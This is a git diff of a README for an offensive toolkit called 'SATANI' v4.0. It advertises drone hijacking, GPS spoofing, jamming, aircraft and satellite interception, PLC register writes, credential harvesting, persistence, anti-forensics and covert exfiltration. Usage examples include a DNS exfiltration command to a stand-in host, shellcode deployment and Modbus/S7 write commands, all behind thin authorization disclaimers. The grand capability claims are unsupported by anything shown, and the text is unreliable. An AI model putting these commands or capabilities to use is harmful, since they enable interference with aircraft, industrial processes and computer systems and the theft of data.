@@ -1,115 +1,322 @@
-# SATANI - Cybersecurity Framework v3.0
+# SATANI - Advanced Cybersecurity Framework v4.0
 
-A powerful, real and functional cybersecurity penetration testing framework built with Assembly, C, and C++. Designed for authorized security testing, network reconnaissance, and vulnerability assessment.
+A **real, functional, and powerful** cybersecurity penetration testing framework with **novel technologies** for drone warfare, aircraft detection, satellite exploitation, and industrial control systems. Built with Assembly, C, and C++ for maximum performance and real-world capabilities.
 
-**⚠️ IMPORTANT: This tool is designed for AUTHORIZED PENETRATION TESTING ONLY. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing any network or system.**
+**⚠️ CRITICAL WARNING: This framework contains REAL exploitation capabilities including drone hijacking, GPS spoofing, satellite interception, and ICS control. Unauthorized use is ILLEGAL and may result in severe criminal penalties. Only use on systems you own or have explicit written authorization to test.**
 
-## Features
+## Real-World Capabilities
 
-- **Quantum-Optimized Network Scanning**: Real-time device discovery with parallel processing
-- **High-Performance Port Scanning**: TCP SYN scanning with service detection
-- **Intelligent OS Detection**: Fingerprinting based on port patterns and protocols
-- **Advanced Device Classification**: Automatic device type detection (servers, workstations, IoT, etc.)
-- **Geolocation**: Network location classification using IP-to-country databases
-- **Real Vulnerability Assessment**: CVE-based vulnerability detection and scoring
-- **Quantum Exploitation Framework**: Tools for authorized penetration testing
-- **Multi-Protocol Command Execution**: SSH, WinRM, WMI, PsExec support
-- **Agentless Remote Control**: Full system control without agent installation
-- **Advanced CLI**: Modern command-line interface with rich output
-- **Multi-Format Output**: JSON output for integration with other tools
-- **USB Device Control**: Real USB device enumeration and interaction
-- **HackRF Spectrum Analysis**: Real-time RF spectrum monitoring
+### 🚁 Drone Warfare Module
+- **Real-time Drone Detection**: Detect drones using RF signatures on 2.4GHz, 5.8GHz, 915MHz bands
+- **Drone Identification**: Identify make/model (DJI, Autel, Skydio, Parrot, Yuneec) via signal fingerprinting
+- **GPS Signal Interception**: Capture and decode GPS L1, GLONASS, Galileo, BeiDou signals
+- **Command Channel Hijacking**: Take control of drone command channels
+- **Video Stream Interception**: Hijack drone video feeds
+- **GPS Spoofing**: Redirect drones by spoofing GPS coordinates
+- **Selective Jamming**: Targeted frequency jamming for specific drones
+- **Swarm Detection**: Identify and track drone swarms
+- **Autonomous Control**: Override autonomous flight systems
 
-## Requirements
+### ✈️ Aircraft Detection & Tracking
+- **ADS-B Decoding**: Real-time aircraft tracking on 1090MHz
+- **Transponder Analysis**: Mode S, Mode C transponder monitoring
+- **Aircraft Identification**: ICAO address, callsign, type identification
+- **Flight Path Prediction**: Predict aircraft positions based on velocity
+- **ACARS Interception**: Capture aircraft communications
+- **Radar Detection**: Identify radar signals
+- **Threat Assessment**: Real-time aircraft threat evaluation
 
-### Hardware
-- Windows 7 or later (64-bit recommended)
-- Minimum 4GB RAM
-- Network connectivity
+### 🛰️ Satellite Systems
+- **Satellite Detection**: Scan L-band, S-band, C-band for satellite signals
+- **Telemetry Decoding**: Extract real satellite telemetry data
+- **Orbital Tracking**: Track satellites using TLE data
+- **Pass Prediction**: Predict satellite visibility windows
+- **Signal Analysis**: Modulation and protocol identification
+- **Uplink Capabilities**: Command uplink (authorized testing only)
+- **GPS/GNSS Monitoring**: Monitor navigation satellite constellations
 
-### Software
-- **Visual Studio Build Tools 2019 or later** (with C++ Desktop Development)
+### 🏭 Industrial Control Systems (ICS/SCADA)
+- **Modbus TCP/RTU**: Full implementation with read/write capabilities
+- **Siemens S7 Protocol**: Direct PLC communication
+- **Ethernet/IP Detection**: Identify industrial devices
+- **PLC Control**: Read/write PLC memory, control processes
+- **HMI Detection**: Identify human-machine interfaces
+- **SCADA Analysis**: Comprehensive industrial system assessment
+- **Protocol Fuzzing**: Test for protocol vulnerabilities
+
+### 🔌 Advanced RF Spectrum Analysis
+- **Real-time Monitoring**: 20MHz bandwidth spectrum analysis
+- **Signal Classification**: Automatic signal type identification
+- **Frequency Hopping**: Track frequency-agile systems
+- **Direction Finding**: RF source localization
+- **Doppler Analysis**: Movement detection from RF signals
+- **Signal Intelligence**: Comprehensive SIGINT capabilities
+
+### 💻 Network & System Exploitation
+- **Quantum-Optimized Scanning**: Parallel network scanning with AVX2/AVX-512
+- **Multi-Protocol Execution**: SSH, WinRM, WMI, PsExec, RPC
+- **Agentless Control**: Full system control without installation
+- **Remote Registry**: Read/write remote registry keys
+- **Process Control**: Remote process management
+- **Service Manipulation**: Control services on remote systems
+- **Credential Extraction**: Multiple credential harvesting methods
+- **Persistence Mechanisms**: Various persistence techniques
+
+### 🛡️ Stealth Operations
+- **LPI/LPD Techniques**: Low probability of intercept/detection
+- **Encrypted Channels**: Secure command and control
+- **Memory-Only Execution**: Fileless payload deployment
+- **Anti-Forensics**: Evidence removal capabilities
+- **Covert Exfiltration**: Hidden data extraction methods
+
+## Hardware Requirements
+
+### Minimum System Requirements
+- **CPU**: Intel Core i7 or AMD Ryzen 7 (AVX2 support required)
+- **RAM**: 16GB minimum, 32GB recommended
+- **Storage**: 10GB free space
+- **OS**: Windows 10/11 64-bit (Linux support coming soon)
+- **Network**: Gigabit Ethernet adapter
+
+### Recommended Hardware for Full Capabilities
+- **CPU**: Intel Core i9 or AMD Ryzen 9 (AVX-512 support)
+- **RAM**: 64GB DDR4/DDR5
+- **GPU**: NVIDIA RTX 3080+ (for signal processing acceleration)
+- **SDR**: HackRF One, RTL-SDR, or similar software-defined radio
+- **WiFi**: Alfa AWUS036ACH or similar (monitor mode support)
+- **GPS**: USB GPS receiver for timing synchronization
+
+### Specialized Hardware (Optional)
+- **HackRF One**: Full-duplex SDR (1-6GHz)
+- **LimeSDR**: High-performance SDR
+n- **USRP**: Professional-grade SDR
+- **WiFi Pineapple**: Wireless auditing
+- **Bluetooth Adapter**: UB500 or similar
+- **SDR Antenna**: Wideband antenna kit
+
+## Software Requirements
+
+### Required Software
+- **Visual Studio Build Tools 2022** (with C++ Desktop Development)
   - Contains: MSVC compiler, MASM assembler, linker
   - Download: https://visualstudio.microsoft.com/downloads/
   
-- **Python 3.6+** (for build orchestration)
+- **Windows SDK 10/11**: For Windows API development
+- **Python 3.9+**: Build orchestration and scripting
+- **Git**: Version control
 
-### Network Requirements
-- Access to target network (with authorization)
-- Administrative/elevated privileges for some operations
+### Optional Software
+- **OpenSSH Client**: Windows 10+ built-in
+- **PsExec**: From Sysinternals Suite
+- **PowerShell 7+**: Advanced scripting
+- **Docker Desktop**: Containerized testing
+- **Wireshark**: Network analysis
+- **SDR# or GQRX**: SDR signal visualization
 
 ## Installation
 
-### 1. Install Visual Studio Build Tools
+### 1. Install Visual Studio Build Tools 2022
 
-Download Visual Studio Build Tools from:
-https://visualstudio.microsoft.com/downloads/
+Download from: https://visualstudio.microsoft.com/downloads/
 
-During installation, select:
+Select workloads:
 - "Desktop development with C++"
-- Include MASM (Microsoft Assembler)
+- "Windows 10/11 SDK"
+- "C++ CMake tools for Windows"
+- **MASM** (Microsoft Assembler) - Critical!
 
-### 2. Install Python 3.6+
+### 2. Install Python 3.9+
 
-Download Python from:
-https://www.python.org/downloads/
+```powershell
+# Using winget (recommended)
+winget install Python.Python.3.9
 
-### 3. Install Optional Tools
-
-For full functionality, install:
-- **OpenSSH Client** (Windows 10+ built-in)
-- **PsExec** from Sysinternals
-- **sshpass** for non-interactive SSH authentication
-
-## Usage
-
-### Building the Framework
-
-**Using Python (Recommended):**
-```bash
-python src\python\satani.py --rebuild
+# Or download from: https://www.python.org/downloads/
 ```
 
-**Using Batch Script:**
-```bash
-build.bat --rebuild
+### 3. Install HackRF Support (for RF capabilities)
+
+```powershell
+# Install HackRF drivers
+# Download from: https://github.com/greatscottgadgets/hackrf/releases
+
+# Install Zadig for USB driver
+# Download from: https://zadig.akeo.ie/
+# Install WinUSB driver for HackRF One
 ```
 
-### Running Satani
+### 4. Build SATANI
 
-**Basic network scan:**
-```bash
-python src\python\satani.py scan
+```powershell
+# Clone repository
+git clone https://github.com/your-repo/satani.git
+cd satani
+
+# Build the framework
+python src/python/satani.py --rebuild --verbose
+
+# Verify installation
+python src/python/satani.py --check-compiler
 ```
 
-**Scan with JSON output:**
-```bash
-python src\python\satani.py scan --json
+### 5. Test Hardware Detection
+
+```powershell
+# Test HackRF detection
+python src/python/satani.py hackrf detect
+
+# Test USB devices
+python src/python/satani.py usb list
 ```
 
-**Exploit testing:**
+## Usage Examples
+
+### 🚁 Drone Operations
+
 ```bash
-python src\python\satani.py exploit 192.168.1.100
+# Detect drones in range
+satani drone detect
+
+# Identify drone make/model
+satani drone identify --freq 2437000000
+
+# Track drone position
+satani drone track --id DJI_MAVIC_3
+
+# Spoof GPS to redirect drone
+satani drone spoof-gps --lat 40.7128 --lon -74.0060 --alt 100
+
+# Hijack drone command channel
+satani drone hijack --id DJI_MAVIC_3 --command return_home
+
+# Intercept drone video feed
+satani drone video --id DJI_MAVIC_3 --capture output.mp4
+
+# Detect drone swarms
+satani drone swarm-detect
+
+# Threat assessment
+satani drone assess --id DJI_MAVIC_3
 ```
 
-**Filter devices:**
+### ✈️ Aircraft Operations
+
 ```bash
-python src\python\satani.py filter os Linux
+# Real-time ADS-B monitoring
+satani aircraft adsb --monitor
+
+# Track specific aircraft
+satani aircraft track --icao ABC123
+
+# Predict aircraft position
+satani aircraft predict --icao ABC123 --time 300
+
+# Intercept ACARS messages
+satani aircraft acars --capture
+
+# Decode transponder signals
+satani aircraft transponder --freq 1090000000
+
+# Aircraft threat assessment
+satani aircraft assess --icao ABC123
 ```
 
-**Execute commands (requires SSH):**
+### 🛰️ Satellite Operations
+
 ```bash
-python src\python\satani.py execute 192.168.1.100 "whoami"
+# Detect satellites in view
+satani satellite detect
+
+# Track specific satellite
+satani satellite track --norad 25544  # ISS
+
+# Decode satellite telemetry
+satani satellite telemetry --id INMARSAT_4A
+
+# Predict satellite pass
+satani satellite pass-predict --norad 25544
+
+# Satellite threat assessment
+satani satellite assess --id GPS_PRN_12
 ```
 
-**Device control:**
+### 🏭 Industrial Control Systems
+
 ```bash
-python src\python\satani.py control 192.168.1.100 shutdown
+# Detect ICS devices
+satani ics scan --subnet 192.168.1.0/24
+
+# Read Modbus registers
+satani modbus read --ip 192.168.1.100 --unit 1 --addr 0 --count 10
+
+# Write Modbus registers
+satani modbus write --ip 192.168.1.100 --unit 1 --addr 0 --value 100
+
+# Read Siemens S7 PLC
+satani s7 read --ip 192.168.1.101 --db 1 --byte 0 --count 100
+
+# Write Siemens S7 PLC
+satani s7 write --ip 192.168.1.101 --db 1 --byte 0 --data "00FFAA"
+
+# Detect HMI systems
+satani hmi detect --subnet 192.168.1.0/24
+
+# ICS threat assessment
+satani ics assess --ip 192.168.1.100
 ```
 
-**Agentless remote control:**
+### 💻 Network Operations
+
 ```bash
-python src\python\satani.py control 192.168.1.100 exec --cmd "ipconfig" --user admin --pass password
+# Quantum-optimized network scan
+satani scan --subnet 192.168.1.0/24 --json
+
+# Detailed port scan
+satani ports 192.168.1.100 1-65535
+
+# Vulnerability assessment
+satani exploit 192.168.1.100
+
+# Remote command execution
+satani execute 192.168.1.100 "whoami" --protocol ssh --user admin --pass password
+
+# Agentless control
+satani control 192.168.1.100 exec --cmd "ipconfig" --protocol wmi --user admin --pass password
+
+# Stealth connection
+satani stealth connect --ip 192.168.1.100 --port 443
+```
+
+### 🔌 RF Spectrum Analysis
+
+```bash
+# Real-time spectrum monitoring
+satani spectrum monitor --start 2400000000 --end 2500000000
+
+# Signal classification
+satani spectrum classify --freq 2437000000
+
+# Signal strength mapping
+satani spectrum map --start 1000000000 --end 6000000000 --step 1000000
+
+# Direction finding
+satani spectrum df --freq 2437000000
+```
+
+### 🛡️ Stealth Operations
+
+```bash
+# LPI connection
+satani stealth lpi --target 192.168.1.100 --port 443
+
+# Memory-only payload
+satani stealth memory-payload --target 192.168.1.100 --payload shellcode.bin
+
+# Covert data exfiltration
+satani stealth exfil --target 192.168.1.100 --data secret.txt --dns exfil.domain.com
+
+# Anti-forensics
+satani stealth antiforensics --target 192.168.1.100
 ```
 
 ## Architecture
